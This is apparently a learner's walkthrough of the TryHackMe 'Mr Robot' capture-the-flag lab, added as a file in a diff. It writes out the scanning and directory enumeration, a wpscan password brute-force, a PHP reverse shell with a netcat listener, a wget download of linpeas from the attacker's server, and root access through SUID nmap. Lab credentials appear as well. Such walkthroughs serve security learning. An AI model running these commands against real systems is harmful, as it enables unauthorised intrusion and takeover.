@@ -1,0 +1,104 @@
+lab : Mr Robot
+
+
+At first i run nmap to find target ip :
+command: nmap -sn 10.188.249.45/24
+i got target ip : 10.188.249.32
+
+then i did port scan to find which port is open :
+command: nmap -p- 10.188.249.32
+
+i found out 2 ports are open : 80/tcp  open   http
+                               443/tcp open   https
+
+i opened it in browser : http:/10.188.249.32     (i found useless clips there)
+
+then i search for its directories by dirb:
+command: dirb http://10.188.249.32
+
+i found out many directories including: robot.txt, sitemap.xml, wp-login, phpmyadmin
+
+in robot.txt i found out: User-agent: *   (it open a wordpress blog page)
+                          fsocity.dic      (its a disc file of lists of names, i downloaded it by:: wget http:/10.188.249.32/fsocity.dic)
+                          key-1-of-3.txt   (its a tryhackme flag)
+
+in sitemap.xml i got error message(XML Parsing Error: no root element found
+                                   Location: http://10.188.249.32/sitemap.xml
+                                    Line Number 1, Column 1:)
+
+in phpmyadmin there is honeypot saying (this site can only be run on localhost and its not running on localhost too)
+
+in wp-login i got login page where i entered random username and password and i found a vulnerability (User Enumeration or Username Enumeration).
+
+i did recon about this lab and i found out Mr robot is series in which elliot is the main character in it so i try this username and random password and i found out username it correct
+
+after it i try to do bruteforce with the names of list i got in robot.txt.
+
+first i sort out the list cause it contains many duplicate names
+command: sort -u fsocity.dic >> sortedfsocity.dic
+
+then i use wpscan cause it is wordpress sitemap with sorted list
+command: wpscan --url http://10.188.249.32/wp-login.php -U elliot -P sortedfsocity.dic
+
+i found out its password : | Username: elliot, Password: ER28-0652
+
+i loged in the wordpress site then i searched it and i try to upload .php file so that i can upload reverseshell in it to get shell
+and i found out i can upload it through themes
+
+i upload my reverseshell.php in themes it shows me this (The package could not be installed. PCLZIP_ERR_BAD_FORMAT (-10) : Unable to find End of Central Dir Record signature)
+so i go to pages -> insert new -> add media -> select my reverseshell.php -> publish it -> view page -> and clicked on it
+
+and run listener in terminal by nc nc -nlvp 4444(port no. same as on script and own ip in script)
+
+i got shell in terminal
+
+in shell i go to cd home -> cd robot -> i got one (key-2-of-3.txt - it is another flag of thm)
+                                     and (password.raw-md5) i cracked it by crackstation and it gives me this output:abcdefghijklmnopqrstuvwxyz
+ so it i had robot:abcdefghijklmnopqrstuvwxyz ( from /home/robot)
+
+ i ran commands:
+
+$whoami
+daemon
+$ id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+$ su robot
+su: must be run from a terminal
+
+so i ran this command to make it feel like commands are running from terminal
+command:$ python -c 'import pty; pty.spawn(" /bin/sh")'     (if not work then try to find the path in it like /bin/bash,/bin/sh, by command which path)
+
+after it i ran su robot and give password that i found from robot directory and i got robot terminal
+
+i opened every useful directories but i cannot able to find where to escilate so i used a tool named peass(used to find the privilage escilation)
+
+i know that in tmp folder is world writeable so i use tmp folder to share tools file
+
+i opened http server by python on port 8000 :
+command:
+┌──(shadow㉿kali)-[/usr/share/peass/linpeas]
+└─$ python3 -m http.server 8000
+
+then in lab terminal ran wget command to download linpeas.sh file in target system
+command: wget http://10.188.249.45:8000/linpeas.sh
+
+i got nothing with this tool(peass)
+
+so i find out files that have suid privilage escilation
+command: find / -perm -u=s -type f 2>/dev/null      (# -perm (permission), -u=s (look for files that are owned by root user), -type (type of file looking for), f (regular file not directories), )
+
+i found out nmap had a permission
+so i searched for nmap suid exploit and go to GTFObins and ran commands
+commands: nmap --interactive
+          !sh
+
+and i got root access !!!
+
+Machine Done!!!!!!!
+
+
+
+
+
+
+
